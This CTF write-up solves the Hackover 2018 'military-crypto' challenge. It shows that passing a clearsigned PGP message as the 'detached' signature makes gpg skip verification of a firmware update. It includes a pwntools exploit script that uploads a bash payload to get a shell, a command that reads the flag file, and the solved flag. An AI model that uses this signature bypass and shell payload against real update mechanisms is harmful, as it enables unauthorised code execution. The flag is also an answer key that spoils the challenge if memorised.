## title
#### challenge
```
We take security seriously so instead of shipping our own crypto we simply use proven military grade technology for our firmware updates.

nc military-crypto.ctf.hackover.de 1337

```

### references
[original write-up](https://security.meta.stackexchange.com/questions/3077/write-ups-hackover-ctf-2018-fri-05-oct-2000-utc-sun-07-oct-1000-utc/3086#3086)

### resources
[name](rellink)

### idea
First we download the firmware with selecting option 2).
This gives the current firmware encoded with base64 (=> ``` cat firm.txt | base64 --decode```):
```bash
 echo 'Reading firmware...'
   touch update.bin.b64
   while IFS='' read -r firmware; do
       if [ -z "$firmware" ]; then break; fi
       echo "$firmware" >> update.bin.b64
   done
   base64 -d update.bin.b64 > update.bin
   rm update.bin.b64

   echo 'Reading detatched signaure...'
   touch update.bin.sig
   while IFS='' read -r signature; do
       if [ -z "$signature" ]; then break; fi
       echo "$signature" >> update.bin.sig.b64
   done
   base64 -d update.bin.sig.b64 > update.bin.sig
   rm update.bin.sig.b64

   if ! gpg --verify update.bin.sig; then
       set +x
       echo '!!!!!!!!!!!!!!!!!!!!!!!'
       echo '!! INVALID SIGNATURE !!'
       echo '!!!!!!!!!!!!!!!!!!!!!!!'
       exit 1
   else
       chmod +x update.bin
       echo 'Updating....'
       ./update.bin
       echo 'Rebooting....'
       exit 0
   fi
```
Also we get a signed message:
```
-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA256

Version: 1.0
Created: 2018-10-03
Audited: KRYPTOCHEF

-----BEGIN PGP SIGNATURE-----

iQIzBAEBCAAdFiEEwSuuOHnM9KfOOGG3QoUB03HVrd8FAlu2ra4ACgkQQoUB03HV
rd9kow//b/uQQonqD02g7VXMBYIUcCljLsGaOgvdEXSA6r6y5iym4DVLrDuZrIHP
ryAV30SJkm6gaxjcA19zYBg79tqcolhJPq4Tsd8bCOBEWG31Gk1LN7mzJbCk5TMO
ylf02qYbgpCULPkNxH87s4S8Oo7z0buR50jWAbe28fPkqyF0AG4iConSeIhKtMYB
LNFIdxXm3u99su5BATf13jSGrIIg+iO8aT7xrohOyaY75FlvsB6DBeDLTwf/9z//
SKVixZVKuoh+b4hevECqmwRB3t/NvyIbHz8e70WHXhWg6CXJMMz41YZylGhwNeDF
I3sHjIJ1wx4FDzH1WSlVcrYSOP4UZacgPzwxjMehvnUW2IGFXRiwsh1z21HI8Nlx
N0YZ5b+uwpj75AmP4mNDYvoGHHk1+fqna4a39y2t7qQEWMkEq2YQiuDQjCGAprC+
Q++8HAtODf566z2pB1h8dsdvOWDzzfMS8z3RC6LFydMEiRzVi7sL0tawY60JPBxH
DX2D6njzPi5XjRCNJiGqrK2qsL2aNxDn7zBQExvEUmgLsSR574YUILLa0xsMhMTA
Zn3ht/Rx7yxZJoN8FM0UvajbFdcDmgj2iullEq3aIpmQChoVnb/yygpCq0353UtY
OWZKfxCcH9mQSbcQCjDUFgr91nTXehMQ6d64bSbLxgZuqWwPoy4=
=IbNc
-----END PGP SIGNATURE-----
```

Uploading this signature as base64 encoded file signature, will bypass the ```gpg --verify update.bin.sig``` with a warning:
```
gpg: WARNING: not a detached signature; file 'update.bin' was NOT verified!
```


### script
```python
from pwn import *
import base64

r = remote("military-crypto.ctf.hackover.de",1337)

msg = """LS0tLS1CRUdJTiBQR1AgU0lHTkVEIE1FU1NBR0UtLS0tLQpIYXNoOiBTSEEyNTYKClZlcnNpb246
IDEuMApDcmVhdGVkOiAyMDE4LTEwLTAzCkF1ZGl0ZWQ6IEtSWVBUT0NIRUYKCi0tLS0tQkVHSU4g
UEdQIFNJR05BVFVSRS0tLS0tCgppUUl6QkFFQkNBQWRGaUVFd1N1dU9Ibk05S2ZPT0dHM1FvVUIw
M0hWcmQ4RkFsdTJyYTRBQ2drUVFvVUIwM0hWCnJkOWtvdy8vYi91UVFvbnFEMDJnN1ZYTUJZSVVj
Q2xqTHNHYU9ndmRFWFNBNnI2eTVpeW00RFZMckR1WnJJSFAKcnlBVjMwU0prbTZnYXhqY0ExOXpZ
Qmc3OXRxY29saEpQcTRUc2Q4YkNPQkVXRzMxR2sxTE43bXpKYkNrNVRNTwp5bGYwMnFZYmdwQ1VM
UGtOeEg4N3M0UzhPbzd6MGJ1UjUwaldBYmUyOGZQa3F5RjBBRzRpQ29uU2VJaEt0TVlCCkxORklk
eFhtM3U5OXN1NUJBVGYxM2pTR3JJSWcraU84YVQ3eHJvaE95YVk3NUZsdnNCNkRCZURMVHdmLzl6
Ly8KU0tWaXhaVkt1b2grYjRoZXZFQ3Ftd1JCM3QvTnZ5SWJIejhlNzBXSFhoV2c2Q1hKTU16NDFZ
WnlsR2h3TmVERgpJM3NIaklKMXd4NEZEekgxV1NsVmNyWVNPUDRVWmFjZ1B6d3hqTWVodm5VVzJJ
R0ZYUml3c2gxejIxSEk4Tmx4Ck4wWVo1Yit1d3BqNzVBbVA0bU5EWXZvR0hIazErZnFuYTRhMzl5
MnQ3cVFFV01rRXEyWVFpdURRakNHQXByQysKUSsrOEhBdE9EZjU2NnoycEIxaDhkc2R2T1dEenpm
TVM4ejNSQzZMRnlkTUVpUnpWaTdzTDB0YXdZNjBKUEJ4SApEWDJENm5qelBpNVhqUkNOSmlHcXJL
MnFzTDJhTnhEbjd6QlFFeHZFVW1nTHNTUjU3NFlVSUxMYTB4c01oTVRBClpuM2h0L1J4N3l4Wkpv
TjhGTTBVdmFqYkZkY0RtZ2oyaXVsbEVxM2FJcG1RQ2hvVm5iL3l5Z3BDcTAzNTNVdFkKT1daS2Z4
Q2NIOW1RU2JjUUNqRFVGZ3I5MW5UWGVoTVE2ZDY0YlNiTHhnWnVxV3dQb3k0PQo9SWJOYwotLS0t
LUVORCBQR1AgU0lHTkFUVVJFLS0tLS0KCg=="""
r.send("1\n" + base64.b64encode(b'#!/bin/bash\n/bin/bash\n')+ "\n\n" + msg + "\n\n")

r.interactive()
```
The flag is found in the directory /home/ctf/. ```cat /home/ctf/flag.txt```.

### flag
hackover18{r0ll_y0_0wn_crypt0_w1th_pgp}

[more write-ups](../../)
